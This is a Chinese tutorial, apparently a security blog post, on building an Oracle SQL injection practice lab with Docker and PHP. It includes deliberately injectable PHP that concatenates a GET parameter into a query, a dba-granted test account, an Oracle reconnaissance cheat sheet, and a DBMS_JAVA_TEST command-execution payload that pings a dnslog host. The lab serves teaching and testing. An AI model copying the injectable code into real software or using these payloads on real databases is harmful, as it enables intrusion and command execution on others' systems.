---
layout: about
category: about
Researchname:  SQL注入原理分析
toc: true
author: Bin4xin
permalink: /about/ALL-SQL-INJECTION-ANALYSIS/
---

# SQL注入原理分析：全类型数据库靶场搭建

## 零：Oracle数据库注入靶场搭建

**使用docker进行oracle数据库渗透测试，测试环境拓扑如下：**

![sql-topo.png](https://i.loli.net/2021/11/18/vew1djPoYpI8OaS.png)

#### 0x01：Oracle服务启动
##### # Oracle 数据库配置一览
- 数据库镜像启动

```bash
#docker下载oracle数据库镜像
docker pull registry.cn-hangzhou.aliyuncs.com/qida/oracle-xe-11g
#docker将镜像加载到名称为oracle的容器后台运行，并映射镜像1521端口到本地1521端口
docker run -d -p 1521:1521 --name oracle registry.cn-hangzhou.aliyuncs.com/qida/oracle-xe-11g
#进入oracle容器的交互式shell
docker exec -it oracle bash

root@bd849e50bab4:/# sqlplus /nolog
SQL> conn sys/oracle as sysdba
Connected.

SQL> select name from v$database;

NAME
---------

XE

```
- 新增用户赋权+建库

```bash
#开辟空间建库
SQL> create tablespace pentest datafile '/tmp/pentest.dbf' size 100m;

Tablespace created.

#创建pentest用户，密码pentest；默认table是pentest
SQL> create user pentest identified by pentest default tablespace pentest;

User created.
#赋权pentest - connect,resource,dba
SQL> grant connect,resource,dba to pentest;

Grant succeeded.

SQL> exit
Disconnected from Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
#pentest用户连接
root@bd849e50bab4:/# sqlplus pentest/pentest

SQL*Plus: Release 11.2.0.2.0 Production on Fri Feb 19 06:38:04 2021

Copyright (c) 1982, 2011, Oracle.  All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```

- 插入测试数据

```bash
#建表
SQL> CREATE TABLE users (id number,name varchar(500),surname varchar(1000));

Table created.
#导入数据
SQL> INSERT INTO users (id, name, surname) VALUES (1, 'luther', 'blisset');
INSERT INTO users (id, name, surname) VALUES (2, 'fluffy', 'bunny');
INSERT INTO users (id, name, surname) VALUES (3, 'wu', 'ming');
INSERT INTO users (id, name, surname) VALUES (4, 'sqlmap/1.0-dev (http://sqlmap.org)', 'user agent header');
INSERT INTO users (id, name, surname) VALUES (5, NULL, 'nameisnull');
commit;
1 row created.

SQL>
1 row created.

SQL>
1 row created.

SQL>
1 row created.

SQL>
1 row created.

SQL> commit;

Commit complete.

SQL> SELECT * FROM users where id=1;

	ID
----------
NAME
--------------------------------------------------------------------------------
SURNAME
--------------------------------------------------------------------------------
	 1
luther
blisset

```

#### 0x02：WEB服务启动
##### # APACHE+PHP+ORACLE

- docker镜像拉取

```bash
docker pull thomasbisignani/docker-apache-php-oracle
cd ~/learn/docker
mkdir oracle_samplePages && cd oracle_samplePages
touch index.php 
########
##配置docker-apache-php-oracle这个镜像启动时：
##1、-v :宿主机文件夹/Users/bin4xin/learn/docker/oracle_samplePages中文件可在虚拟机文件夹/var/www/html中被访问到；即：
########宿主机/Users/bin4xin/learn/docker/oracle_samplePages文件夹为docker-apache-php-oracle web服务的根目录
##2、-p :映射docker 80 端口到本机的8090端口下；
##3、-d :后台运行
########
docker run -p 8090:80 -d -v /Users/bin4xin/learn/docker/oracle_samplePages:/var/www/html thomasbisignani/docker-apache-php-oracle 
```

- php连库代码

```php
cat index.php                      
<?php

$username = 'pentest';
$password = 'pentest';

$connectText = '//127.0.0.1:1521/XE';

$conn = oci_connect($username, $password, $connectText);
if (!$conn) {
    $e = oci_error();
    echo 'Oracle connect failed <br />';
    exit($e['message']);
}

echo 'Oracle connect ok'."<br>";
?>
```

- PHP靶场SQL注入代码

```php
<?php

$username = 'pentest';
$password = 'pentest';

$connectText = '//127.0.0.1:1521/XE';
 $conn = oci_connect($username, $password, $connectText);
 if (!$conn) {
     $e = oci_error();
     echo 'Oracle connect failed <br />';
     exit($e['message']);
 }
 echo 'Oracle connect ok' . "<br>";
 // Prepare the statement
 if (!isset($_GET['id']) || $_GET['id'] == null) {
     echo "oracle sqlinjection test: oracle_test.php?id=1</br>";
     $stid = oci_parse($conn, "select * from USERS");
 } else {
     //SQL injection!!!!!!
     $stid = oci_parse($conn, "SELECT * FROM users where id=" . $_GET['id']);
 }
 if (!$stid) {
     $e = oci_error($conn);
     exit($e['message']);
 }
 // Perform the logic of the query
 $r = oci_execute($stid);
 if (!$r) {
     $e = oci_error($stid);
     exit($e['message']);
 }
 // Fetch the results of the query
 print "<table border='1'>\n";
 while ($row = oci_fetch_array($stid, OCI_ASSOC+OCI_RETURN_NULLS)) {
     print "<tr>\n";
     foreach ($row as $item) {
         $item = ($item !== null ? mb_convert_encoding($item, 'utf-8', 'gbk') : " ");
         print "    <td>" . $item . "</td>\n";
     }
     print "</tr>\n";
 }
 print "</table>\n";
 oci_free_statement($stid);
 oci_close($conn);
 ?>
```

##### # 连库成功效果图

![web-connect-oracle-success.png](https://i.loli.net/2021/11/18/Gd2fjncXqtPQNHl.png)


#### 0x03：SQL注入靶场启动

至此，注入靶场搭建完毕。SQLMAP注入效果：

![sql-inject-success.png](https://i.loli.net/2021/11/18/LHSrI9bTXWstmxR.png)

---

渗透常用语句：

```bash
# 当前用户权限
select * from session_roles
# 当前数据库版本
select banner from sys.v_$version where rownum=1
# 服务器出口IP
用utl_http.request 可以实现
# 服务器监听IP地址
select utl_inaddr.get_host_address from dual
# 服务器操作系统
select member from v$logfile where rownum=1
# 服务器sid查询，远程连接的话需要
select instance_name fromv$instance;
# 当前连接用户
select SYS_CONTEXT ('USERENV', 'CURRENT_USER')from dual
```
命令执行：
```bash
Select DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','ping ojuht0.dnslog.cn') from dual;
```

以上。
